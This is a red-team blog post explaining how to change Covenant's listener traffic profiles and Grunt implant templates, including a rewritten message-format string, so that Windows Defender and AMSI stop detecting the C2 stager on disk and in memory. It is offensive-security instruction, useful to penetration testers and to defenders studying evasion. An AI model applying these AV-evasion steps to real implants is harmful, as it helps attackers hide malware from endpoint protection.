---
title: "Using Custom Covenant Listener Profiles & Grunt Templates to Elude AV"
date: 2020-11-07T11:54:14Z
authors:
    - rastamouse
draft: false
---

Whenever we download an offensive tool from the Internet, it comes as no surprise when it gets snapped up by an anti-virus solution.  AV vendors are certainly keeping a keen eye on tools posted publicly (insert conspiracy theory about Microsoft owning GitHub) and are reacting relatively quickly to push signatures for those tools.  However, it's probably fair to say that these signatures are not particularly robust, and only really serve to catch those that don't have the skills or knowledge to make the necesary modifications.

This holds true for Covenant's Windows implant - Grunts.

![grunt-blocked](/images/covenant-profiles-templates/default-launcher.png "Default PowerShell Launcher blocked")

[Ryan's](https://twitter.com/cobbr_io) position is (quite rightly) that circumventing AV is a step that the user is responsible for. It is not the goal of the project to provide undetectable implants or magic "AV bypass" buttons. However, Covenant does provide various means of changing the default Grunt behaviour, which can be leveraged in such a way as to remove the indicators that a particular security product is finding.

This post will look at **Traffic Profiles** and **Grunt Templates**.

Instead of making modifications willy-nilly, we need to know (with a reasonable degree of accuracy) which part(s) of the Grunt Stager get detected.  For that I use [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck), which will split a sample into multiple chunks and submit them either to `AMSI` or Defender's `MpCmdRun` utility.

## Traffic Profiles

Create a new listener with one of the default profiles, then generate and download the associated Binary Launcher to a folder that has an AV exclusion (so that it doesn't get removed instantly).

Next, scan that Stager with ThreatCheck:  `ThreatCheck.exe -f C:\Tools\GruntHTTP.exe`

![threatcheck](/images/covenant-profiles-templates/threatcheck-default-launcher.png "ThreatCheck default stager")

ThreatCheck dumps a 256-byte hex view up from the end of the offending bytes, so the "interesting" bytes are always at the bottom.  Be aware that if the actual bad bytes are greater than 256 in length, it will be truncated in this view.  In any case, we see here the connect address for the listener, followed by the base64 encoded string `VXNlci1BZ2VudA==` with is `User-Agent`.

These request headers are part of the traffic profile that we created our listener with.  If we go into the profile editor, we're free to add, remove, change these as we see fit.

![defaultheaders](/images/covenant-profiles-templates/default-request-headers.png "Default HTTP headers")

I opted to insert an additional header at the top so that the base64 encoded string for User-Agent was not appearing directly after the connect URL.  There are plenty of valid headers to [choose from](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields).

![newheader](/images/covenant-profiles-templates/new-request-headers.png "New HTTP header")

Now when we regenerate the Binary Launcher and scan it with ThreatCheck, that particular detection is gone, but we get another one.  ThreatCheck will only show one detection at a time, so this is certainly an iterative process.

![threatcheck](/images/covenant-profiles-templates/threatcheck-message-format.png "ThreatCheck Message Format")

## Grunt Templates

This detection comes from the StagerCode in the Grunt template, rather than the traffic profile.

![messageformat](/images/covenant-profiles-templates/stagercode-message-format.png "StagerCode Message Format")

On the assumption that this is a simple string detection, we can try and circumvent it using concatenation or other string-manipulations.  I replaced line 43 with `string MessageFormat = GetMessageFormat;` and inserted a new method for retrieving the string via a string builder.

```
public static string GetMessageFormat
{
    get
    {
        var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
        sb.Append(@"""Type"":{1},");
        sb.Append(@"""Meta"":""{2}"",");
        sb.Append(@"""IV"":""{3}"",");
        sb.Append(@"""EncryptedMessage"":""{4}"",");
        sb.Append(@"""HMAC"":""{5}""}}");
        return sb.ToString();
    }
}
```

Regenerate the stager and this time we have no detections from ThreatCheck.

```
ThreatCheck.exe -f C:\Users\Rasta\Downloads\GruntHTTP.exe
[+] No threat found!
[*] Run time: 0.23s
```

With a feeling of elation we run the Stager, but it seems to break at Stage2. So what's going on here?

![stage2](/images/covenant-profiles-templates/stage2-grunt.png "Stage2 Grunt")

Well, this machine has .NET Framework 4.8 installed so AMSI is scanning content being passed into `Assembly.Load()`. This is the penultimate instruction the Stager performs before passing control to the full Grunt stage.

```
Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
```

So something in that final stage is being flagged by AMSI and is being prevented from loading.  It turns out that the ExecutorCode in the Grunt template has the same message format string that we changed in the StagerCode.

![executor](/images/covenant-profiles-templates/executorcode-message-format.png "Executor Message Format")

I swapped this for the same getter as in the Stager:

```
private static string GruntEncryptedMessageFormat
{
    get
    {
        var sb = new StringBuilder(@"{{""GUID"":""{0}"",");
        sb.Append(@"""Type"":{1},");
        sb.Append(@"""Meta"":""{2}"",");
        sb.Append(@"""IV"":""{3}"",");
        sb.Append(@"""EncryptedMessage"":""{4}"",");
        sb.Append(@"""HMAC"":""{5}""}}");
        return sb.ToString();
    }
}
```

Et voila.

![binary](/images/covenant-profiles-templates/binary-grunt.png "Binary Grunt")

Because all the launchers are derived from the same source you may find that others just start working (such as the PowerShell launcher).  Other launchers, like the MSBuild may have additional indicators that you have to work around.

![powershell](/images/covenant-profiles-templates/powershell-grunt.png "PowerShell Grunt")

## Conclusion

This post has demonstrated how to use the Covenant Traffic Profiles and Grunt Templates to avoid detections by Windows Defender (both on disk and in memory), without relying on code execution-based bypassed such as patching the AmsiScanBuffer exported function.

Modifying the traffic profile may provide an additional advantage of avoiding network-based defensive solutions such as IDS/IPS.

The same methodology can be extended to avoid signatures of other AV engines and for other Grunt Launchers.